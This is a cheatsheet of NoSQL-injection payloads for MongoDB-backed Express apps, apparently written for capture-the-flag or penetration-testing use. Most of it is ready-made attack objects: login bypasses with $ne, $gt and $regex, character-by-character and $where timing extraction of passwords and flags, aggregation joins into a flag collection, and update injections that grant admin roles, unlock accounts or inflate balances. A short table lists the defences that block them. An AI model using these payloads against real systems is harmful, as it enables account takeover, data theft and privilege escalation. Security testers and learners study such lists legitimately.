# Cheatsheet — the NoSQLi quick-reference

## The carrier — how the object arrives

| Shape | Carrier | Body |
|---|---|---|
| JSON | `express.json` | `{"user":{"$ne":null}}` |
| form | `qs` extended | `user[$ne]=x` |
| query | `qs` | `?filter[user][$ne]=x` |
| header | `x-filter` | `{"user":{"$ne":null}}` |
| array | `qs` | `user[][$ne]=x` |

## The operator quick-map

| Operator | Purpose | Payload |
|---|---|---|
| `$ne` | exists / not-equal | `{"$ne":null}` / `{"$ne":"x"}` |
| `$gt`/`$gte` | compare / bisect | `{"$gt":"m"}` / `{"$gte":"flag"}` |
| `$regex` | prefix / char / case | `{"$regex":"^a"}` / `{"$regex":"^.{20}$"}` |
| `$where` | JS predicate | `{"$where":"this.pass[0]=='f'"}` |
| `$expr` | agg operators in query | `{"$expr":{"$eq":[{"$substrCP":["$p",0,4]},"flag"]}}` |
| `$in`/`$nin` | in-list | `{"$in":["admin","root"]}` |
| `$or`/`$and`/`$nor` | logical | `{"$or":[{"a":1},{"b":2}]}` |
| `$not` | negate | `{"$not":{"$eq":"x"}}` |
| `$exists` | field-exists | `{"$exists":true}` |
| `$type` | BSON-type | `{"$type":"string"}` / `{"$type":2}` |
| `$size` | array-length | `{"$size":2}` |
| `$all` | all-in | `{"$all":["a","b"]}` |
| `$elemMatch` | subdoc-filter | `{"$elemMatch":{"p":{"$gt":0}}}` |
| `$mod` | modulo | `{"$mod":[4,0]}` |
| `$rename` | rename field | `{"$rename":{"a":"b"}}` |
| `$lookup`/`$unionWith` | join other collection | `aggregation.md` |

## The auth-bypass table

```json
{"user":"admin","pass":{"$ne":null}}                       — admin + any pass
{"user":{"$regex":"^admin"},"pass":{"$ne":null}}          — partial user
{"user":{"$gt":""},"pass":{"$gt":""}}                     — any non-empty
{"user":{"$ne":null},"pass":{"$ne":null}}                 — any + any
{"$or":[{"user":"admin"},{"user":"x"}],"pass":{"$ne":null}} — $or-branch
{"user":{"$in":["admin","root"]},"pass":{"$ne":null}}     — $in-list
{"user":"admin","pass":{"$gt":""}}                        — $gt non-empty
{"user":"admin","pass":{"$exists":true}}                  — field-exists
{"user":"admin","$where":"this.pass.length>0"}            — $where
{"user":"admin","$expr":{"$gt":[{"$strLenCP":"$pass"},0]}}  — $expr len
```

## The extraction table

```json
{"pass":{"$regex":"^a"}}                    — prefix
{"pass":{"$regex":"^.{N}c"}}                 — position
{"pass":{"$regex":"^.{N}$"}}                 — length
{"pass":{"$gt":"m"}}                        — range-bisect
{"pass":{"$gte":"a","$lt":"n"}}              — bounded-range
{"pass":{"$in":["a","b"]}}                  — set-membership
{"$expr":{"$eq":[{"$substrCP":["$p",0,1]},"f"]}}  — $substrCP
{"$expr":{"$eq":[{"$strLenCP":"$pass"},20]}}      — $strLenCP
{"$expr":{"$eq":[{"$indexOfCP":["$p","{"]},4]}}   — $indexOfCP
{"$expr":{"$regexMatch":{"input":"$p","regex":"^a"}}} — $regexMatch
{"user":{"$where":"this.pass[0]=='f'"}}       — $where
{"user":{"$where":"this.pass[0]=='f'?sleep(3000):true"}}  — $where timing
```

## The aggregation table

```json
[{"$unionWith":"flag"}]                                     — join flag col
[{"$lookup":{"from":"flag","localField":"x","foreignField":"y","as":"f"}}]
[{"$project":{"flag":1}}]                                   — project flag
[{"$group":{"_id":null,"f":{"$first":"$flag"}}}]            — group-first
[{"$sort":{"flag":1}}]                                      — sort flag
[{"$facet":{"a":[{"$match":{"flag":{"$exists":true}}}]}}]    — facet
[{"$set":{"flag":"$flag"}}]                                  — $set
[{"$match":{"flag":{"$regex":"^a"}}}]                        — $match
[{"$redact":{"$cond":{"if":{"$eq":["$u","admin"]},"then":"$$KEEP","else":"$$PRUNE"}}}]
```

## The update-injection table

```json
{"$set":{"role":"admin"}}                   — set a field
{"$unset":{"isLocked":""}}                  — remove a field
{"$inc":{"balance":9999}}                   — increment
{"$rename":{"a":"b"}}                       — rename
{"$push":{"roles":"admin"}}                 — array-push
{"$addToSet":{"perms":"*"}}                 — array-addunique
{"$pull":{"bans":"me"}}                     — array-remove
{"$mul":{"score":2}}                        — multiply
{"$min":{"limit":0}}                        — min-bound
{"$max":{"cap":999}}                        — max-bound
{"$currentDate":{"ts":true}}                — set now
{"$bit":{"flags":{"and":15}}}               — bitwise
{"$setOnInsert":{"admin":true}}             — upsert-only
```

## The falsifier table

| Denied by | Symptom |
|---|---|
| `String(req.body.x)` | `{$ne:null}` → `"[object Object]"` |
| `sanitizeFilter` | `$`-keys stripped |
| `extended:false` | `user[$ne]=x` stays flat |
| `enableJs:false` | `$where`/`$function` dead |
| `typeof !== 'string'` | object rejected 400 |
| whitelist | only `$eq`/`$in` pass |
| bcrypt compare | pass-object throws |

## The evidence table

| Verdict | Needs |
|---|---|
| `confirms` | verbatim excerpt + `pre-probe` + `post-probe` + `--response` |
| `denies` | verbatim negative + falsifier fired |
| `inconclusive` | ambiguous — record, don't claim |
| flag | `pre-flag` + verbatim + live response |
